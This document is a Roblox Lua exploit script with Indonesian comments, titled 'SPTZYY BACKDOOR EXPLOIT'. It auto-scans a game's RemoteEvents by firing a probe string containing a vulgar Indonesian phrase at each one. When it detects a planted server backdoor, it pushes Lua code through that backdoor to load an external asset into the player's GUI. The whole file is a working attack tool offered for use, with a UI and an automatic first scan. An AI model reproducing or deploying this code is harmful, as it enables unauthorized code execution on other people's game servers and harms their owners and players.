-- [[ SPTZYY BACKDOOR EXPLOIT - SOLO EXECUTION ]] --
-- Fokus: Auto Brute-Force & Instant Execution (No List)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local lp = Players.LocalPlayer

-- [[ VARIABEL LOGIKA INTI ]] --
local modelName = "sptzyy"
local zyy = nil
local lastFired = nil
local isScanning = false
local assetID = 73729830375562

-- [[ 🖥️ UI SETUP ]] --
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 280, 0, 180)
MainFrame.Position = UDim2.new(0.5, -140, 0.5, -90)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainFrame.Visible = false
MainFrame.Active = true
MainFrame.Draggable = true 
Instance.new("UICorner", MainFrame)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Title.Text = "SPTZYY BACKDOOR"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.Font = Enum.Font.Code
Instance.new("UICorner", Title)

local StatusBox = Instance.new("TextLabel", MainFrame)
StatusBox.Size = UDim2.new(0.9, 0, 0, 60)
StatusBox.Position = UDim2.new(0.05, 0, 0.3, 0)
StatusBox.BackgroundColor3 = Color3.new(0, 0, 0)
StatusBox.Text = "STATUS: READY"
StatusBox.TextColor3 = Color3.new(1, 1, 0)
StatusBox.Font = Enum.Font.Code
StatusBox.TextSize = 12
Instance.new("UICorner", StatusBox)

-- [[ ⚙️ CORE LOGIC ]] --

local function ExecutePayload()
    if zyy and typeof(zyy) == "Instance" then
        StatusBox.Text = "💉 EXECUTING PAYLOAD..."
        local insertPayload = [[
            local player = game.Players:FindFirstChild("]] .. lp.Name .. [[")
            if player and player:FindFirstChild("PlayerGui") then
                local asset = game:GetService("InsertService"):LoadAsset(]] .. assetID .. [[)
                asset.Parent = player.PlayerGui
                for _, child in ipairs(asset:GetChildren()) do
                    child.Parent = player.PlayerGui
                end
                asset:Destroy()
            end
        ]]
        pcall(function() zyy:FireServer(insertPayload) end)
    end
end

workspace.ChildAdded:Connect(function(child)
    if child.Name == modelName and zyy == nil then
        zyy = lastFired
        StatusBox.Text = "✅ BACKDOOR FOUND!\nEXECUTING..."
        StatusBox.TextColor3 = Color3.new(0, 1, 0)
        ExecutePayload()
    end
end)

local function RunAutoScan()
    if isScanning then return end
    isScanning = true
    StatusBox.Text = "🚀 BRUTING REMOTES..."
    
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj.Name == modelName then obj:Destroy() end
    end

    local payload = " KONTOL MESUM😂 "

    task.spawn(function()
        for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer(payload)
                end)
                lastFired = remote
                RunService.RenderStepped:Wait()
            end
        end
        isScanning = false
        if not zyy then
            StatusBox.Text = "❌ NO VULNERABILITY\nRE-SCAN MANUALLY"
            StatusBox.TextColor3 = Color3.new(1, 0, 0)
        end
    end)
end

-- Tombol Scan Manual
local ScanBtn = Instance.new("TextButton", MainFrame)
ScanBtn.Size = UDim2.new(0.9, 0, 0, 35)
ScanBtn.Position = UDim2.new(0.05, 0, 0.72, 0)
ScanBtn.Text = "FORCE RE-SCAN"
ScanBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
ScanBtn.TextColor3 = Color3.new(1, 1, 1)
ScanBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", ScanBtn)
ScanBtn.MouseButton1Click:Connect(RunAutoScan)

-- Icon Toggle
local Icon = Instance.new("ImageButton", ScreenGui)
Icon.Size = UDim2.new(0, 60, 0, 60)
Icon.Position = UDim2.new(0.05, 0, 0.4, 0)
Icon.Image = "rbxassetid://6031280227"
Icon.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Icon.Draggable = true
Icon.Active = true
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1, 0)

Icon.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

-- Jalankan Scan Awal
task.delay(1, RunAutoScan)
